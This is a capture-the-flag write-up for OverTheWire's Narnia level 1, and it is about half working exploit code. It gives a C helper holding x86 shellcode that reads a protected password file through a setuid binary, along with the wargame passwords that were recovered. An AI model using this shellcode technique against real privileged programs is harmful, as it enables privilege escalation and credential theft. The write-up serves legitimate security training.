# Narnia Level 01 to 02

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Narnia |
| Level | 1 -> 2 |
| Status | Complete |

## Objective

Use the `EGG` environment variable execution primitive to recover `narnia2`.

## Given Access

User: `narnia1`

Password:

```text
WDcYUTG5ul
```

## Recon

`/narnia/narnia1.c` simply checks that `EGG` exists, assigns `ret = getenv("EGG")`, and jumps to it with `ret();`.

## Method

Place null-free shellcode in `EGG` that opens and prints `/etc/narnia_pass/narnia2`, then execute `/narnia/narnia1`. A tiny helper compiled in `/tmp` is enough to set the environment and `execl()` the setuid binary.

## Commands

```bash
ssh -p 2226 narnia1@narnia.labs.overthewire.org
wd=$(mktemp -d /tmp/n1.XXXXXX)
cd "$wd"
cat > run.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>
int main(){
  char sc[] = "\x6a\x01\xfe\x0c\x24\x68\x6e\x69\x61\x32\x68\x2f\x6e\x61\x72\x68\x70\x61\x73\x73\x68\x6e\x69\x61\x5f\x68\x2f\x6e\x61\x72\x68\x2f\x65\x74\x63\x89\xe3\x31\xc9\x6a\x05\x58\xcd\x80\x6a\x01\x5b\x89\xc1\x31\xd2\x68\xff\xff\xff\x7f\x5e\x31\xc0\xb0\xbb\xcd\x80";
  setenv("EGG", sc, 1);
  execl("/narnia/narnia1", "narnia1", NULL);
}
EOF
gcc -m32 -fno-stack-protector -z execstack -o run run.c
./run
```

## Result

Password for `narnia2`:

```text
5agRAXeBdG
```

## Lesson

A direct function-pointer call into attacker-controlled environment data turns shellcode execution into the shortest possible exploit path.

## References

- https://overthewire.org/wargames/narnia/
